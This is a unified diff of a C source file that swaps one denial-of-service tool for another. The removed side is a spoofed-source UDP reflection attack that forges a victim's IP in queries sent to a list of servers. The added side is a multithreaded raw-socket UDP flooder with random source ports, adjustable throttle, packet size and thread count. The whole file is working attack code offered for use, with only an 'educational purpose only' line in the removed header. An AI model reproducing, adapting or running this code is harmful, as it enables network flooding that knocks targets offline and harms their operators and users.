@@ -1,187 +1,247 @@
-/*
-    Spoofed UDP by eKKiM
-	Educational purpose only please.
-	--Note by MFJC--
-	Compile:
-		apt-get update
-		apt-get install gcc
-		gcc udp.c -pthread
-	Usage: ./a.out ip port time ipfile.txt message
-*/
+#include <time.h>
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <netdb.h>
+#include <pthread.h>
+#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <netinet/tcp.h>
-#include <netinet/udp.h>
+#include <string.h>
+#include <sys/socket.h>
 #include <netinet/ip.h>
-#include <pthread.h>
+#include <netinet/udp.h>
  
-void D(char *message)
-{
-	printf(message);
-	fflush(stdout);
-}
+#define MAX_PACKET_SIZE 4096
+#define PHI 0x9e3779b9
  
-typedef struct file_list
-{
-	unsigned long ip;
-	int port;
+static uint32_t Q[4096], c = 362436;
+ 
+struct thread_data{
+        int pks;
+        int throttle;
+	int thread_id;
+	unsigned int floodport;
+	struct sockaddr_in sin;
 };
  
-typedef struct pthread_param
+void init_rand(uint32_t x)
 {
-	unsigned long victim_ip;
-	int victim_port;
-	struct file_list *list;
-	int list_size;
-	char *message;
-};
+        int i;
  
-typedef struct pseudo_header
-{
-    unsigned int source_address;
-    unsigned int dest_address;
-    unsigned char placeholder;
-    unsigned char protocol;
-    unsigned short tcp_length;
-    struct tcphdr tcp;
-};
+        Q[0] = x;
+        Q[1] = x + PHI;
+        Q[2] = x + PHI + PHI;
  
-void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
-{
-    int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
-    char packet[4096];
-    struct iphdr *iph = (struct iphdr *) packet;
-    // struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip));
-	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct ip));
-    struct sockaddr_in sin;
-    struct pseudo_header psh;
- 
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(destport);
-    sin.sin_addr.s_addr = destip;
- 
-    memset (packet, 0, 4096);
- 
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 16;
-    iph->tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
-    iph->id = htonl (54321); 
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0; 
-    iph->saddr = srcip; 
-    iph->daddr = sin.sin_addr.s_addr;
- 
-	udph->source = htons(srcport);
-    // Destination port number
-    udph->dest = htons(destport);
-    udph->len = htons(sizeof(struct udphdr));
-	udph->check = 0; //Kernel fill this in?
- 
-	strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));
- 
-    //IP_HDRINCL needed for own headers
-	int one = 1;
-	const int *val = &one;
-	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
-	{
-		printf ("[x] Cannot set socket options (are we r00t?)\n");
-		return;
-	}
- 
-	if (sendto (s, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
-		printf ("[x] Error sending packet\n");
- 
-	close(s);
-    return;
+        for (i = 3; i < 4096; i++)
+                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
 }
  
-void *thread_attack(void *thread_params)
+uint32_t rand_cmwc(void)
 {
-	struct pthread_param *params = thread_params;
-	int i;
- 
-	while (1)
-		for (i = 0; i < params->list_size; i++)
-			attack(params->victim_ip, rand() % 65534 + 1, params->list[i].ip, params->list[i].port, params->message);
-			// Hmm should we use random port or params->victim_port?
+        uint64_t t, a = 18782LL;
+        static uint32_t i = 4095;
+        uint32_t x, r = 0xfffffffe;
+        i = (i + 1) & 4095;
+        t = a * Q[i] + c;
+        c = (t >> 32);
+        x = t + c;
+        if (x < c) {
+                x++;
+                c++;
+        }
+        return (Q[i] = r - x);
 }
  
-char *getLine(FILE *f)
+char *myStrCat (char *s, char *a) {
+    while (*s != '\0') s++;
+    while (*a != '\0') *s++ = *a++;
+    *s = '\0';
+    return s;
+}
+ 
+char *replStr (char *str, size_t count) {
+    if (count == 0) return NULL;
+    char *ret = malloc (strlen (str) * count + count);
+    if (ret == NULL) return NULL;
+    *ret = '\0';
+    char *tmp = myStrCat (ret, str);
+    while (--count > 0) {
+        tmp = myStrCat (tmp, str);
+    }
+    return ret;
+}
+ 
+ 
+/* function for header checksums */
+unsigned short csum (unsigned short *buf, int nwords)
 {
-	char *buffer = malloc(sizeof(char));
-	int pos = 0;
-	char c;
- 
-	do { // read one line
-		c = fgetc(f);
-		if(c != EOF) buffer[pos++] = (char)c;
-		buffer = (char*)realloc(buffer, sizeof(char) * (pos + 2));
-	} while (c != EOF && c != '\n');
- 
-	return buffer;
-} 
- 
-int main (int argc, char *argv[])
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+  sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
 {
-	struct file_list *list = NULL;
-	int list_size = 0;
+  struct ifaddrs *ifaddr, *ifa;
+           int family, s;
+           char host[NI_MAXHOST];
  
-	struct pthread_param param;
-	pthread_t udp_attack;
+           if (getifaddrs(&ifaddr) == -1) {
+               perror("getifaddrs");
+               exit(EXIT_FAILURE);
+           }
  
-	printf("Spoofed UDP Attack\n");
-	printf("          by eKKiM\n");
-	printf("          for Orgy\n\n");
+           /* Walk through linked list, maintaining head pointer so we
+              can free list later */
  
-	if (argc != 6)
-	{
-		printf("Usage: %s <destip> <destport> <ip_file_list> <time in seconds> <message>\n", argv[0]);
-		return -1;
-	}
+           for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+               if (ifa->ifa_addr == NULL)
+                   continue;
  
-	srand(time(0));
+               family = ifa->ifa_addr->sa_family;
  
-	FILE *pFile = fopen(argv[3], "r");
-	if (pFile == NULL)
-	{
-		printf("[X] Cannot open file\n");
-		return -1;
-	}
+               if (family == AF_INET) {
+                   s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),
+                           host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+                   if (s != 0) {
+                       printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                       exit(EXIT_FAILURE);
+                   }
+                   if(strcmp(host, "127.0.0.1") != 0){
+                       break;
+                   }
+               }
+           }
+           freeifaddrs(ifaddr);
+  iph->ihl = 5;
+  iph->version = 4;
+  iph->tos = 0;
+  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
+  iph->id = htonl(54321);
+  iph->frag_off = 0;
+  iph->ttl = MAXTTL;
+  iph->protocol = IPPROTO_UDP;
+  iph->check = 0;
  
-	while (!feof(pFile))
-	{
-		char *line;
-		line = getLine(pFile);
-		char ip[1024];
-		int port;
+  // Initial IP, changed later in infinite loop
+  iph->saddr = inet_addr(host);
+}
  
-		if (sscanf(line, "%99[^:]:%99d", ip, &port) == 2)
-		{
-			list_size++;
-			list = (struct file_list *) realloc(list, sizeof(struct file_list) * list_size);
-			list[list_size - 1].ip = inet_addr(ip);
-			list[list_size - 1].port = port;
-		}
-		free(line);
-	}
+void setup_udp_header(struct udphdr *udph)
+{
+  udph->source = htons(5678);
+  udph->check = 0;
+}
  
-	fclose(pFile);
+void *flood(void *par1)
+{
+  struct thread_data *td = (struct thread_data *)par1;
+  fprintf(stdout, "Thread %d started\n", td->thread_id);
+  char datagram[MAX_PACKET_SIZE];
+  struct iphdr *iph = (struct iphdr *)datagram;
+  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+  struct sockaddr_in sin = td->sin;
+  char new_ip[sizeof "255.255.255.255"];
  
-	param.victim_ip = inet_addr(argv[1]);
-	param.victim_port = atoi(argv[2]);
+  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+  if(s < 0){
+    fprintf(stderr, "Could not open raw socket.\n");
+    exit(-1);
+  }
  
-	param.list = list;
-	param.list_size = list_size;
+  unsigned int floodport = td->floodport;
  
-	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
+  // Clear the data
+  memset(datagram, 0, MAX_PACKET_SIZE);
  
-	pthread_create( &udp_attack, NULL, thread_attack, (void*) &param);
+  // Set appropriate fields in headers
+  setup_ip_header(iph);
+  setup_udp_header(udph);
  
-	printf("[*] Attacking..\n");
-	sleep(atoi(argv[4]));
-	printf("[!] Done\n");
-	return 0;
+  char *data = (char *)udph + sizeof(struct udphdr);
+  data = replStr("\xFF", td->pks);
+  udph->len=htons(td->pks);
+ 
+  iph->tot_len += td->pks;
+ 
+  udph->dest = htons(floodport);
+ 
+  iph->daddr = sin.sin_addr.s_addr;
+  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+ 
+  int tmp = 1;
+  const int *val = &tmp;
+  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+    exit(-1);
+  }
+ 
+  int throttle = td->throttle;
+ 
+  uint32_t random_num;
+  uint32_t ul_dst;
+  init_rand(time(NULL));
+  if(throttle == 0){
+    while(1){
+      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+      random_num = rand_cmwc();
+      udph->source = htons(random_num & 0xFFFF);
+      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    }
+  } else {
+    while(1){
+      throttle = td->throttle;
+      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+      random_num = rand_cmwc();
+      udph->source = htons(random_num & 0xFFFF);
+      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+ 
+     while(--throttle);
+    }
+  }
+}
+int main(int argc, char *argv[ ])
+{
+  if(argc < 6){
+    fprintf(stderr, "Invalid parameters!\n");
+    fprintf(stdout, "UDP Flooder v1.2.8 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <packet size> <number threads to use> <time (optional)>\n", argv[0]);
+    exit(-1);
+  }
+ 
+  fprintf(stdout, "Setting up Sockets...\n");
+ 
+  int num_threads = atoi(argv[5]);
+  int packet_size = atoi(argv[4]);
+  unsigned int floodport = atoi(argv[2]);
+  pthread_t thread[num_threads];
+  struct sockaddr_in sin;
+ 
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(floodport);
+  sin.sin_addr.s_addr = inet_addr(argv[1]);
+ 
+  struct thread_data td[num_threads];
+ 
+  int i;
+  for(i = 0;i<num_threads;i++){
+    td[i].thread_id = i;
+    td[i].pks = packet_size;
+    td[i].sin = sin;
+    td[i].floodport = floodport;
+    td[i].throttle = atoi(argv[3]);
+    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+  }
+  fprintf(stdout, "Starting Flood...\n");
+  if(argc > 6)
+  {
+    sleep(atoi(argv[6]));
+  } else {
+    while(1){
+      sleep(1);
+    }
+  }
+ 
+  return 0;
 }
